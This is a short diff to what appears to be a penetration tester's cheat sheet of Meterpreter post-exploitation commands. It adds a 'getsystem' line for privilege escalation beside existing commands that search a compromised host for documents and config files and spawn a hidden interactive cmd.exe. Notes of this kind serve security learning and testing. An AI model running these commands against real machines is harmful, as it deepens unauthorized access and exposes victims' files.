@@ -111,6 +111,8 @@ search -f autoexec.bat
 search -f *.docx
 serach -f config*
 execute -f cmd.exe -i -H
+#for priv es
+getsystem
 ```
 
 use `shell` to drop into a system shell. This can be useful when our shells dies, we can return to the meterpreter session with `^c` or `exit`.
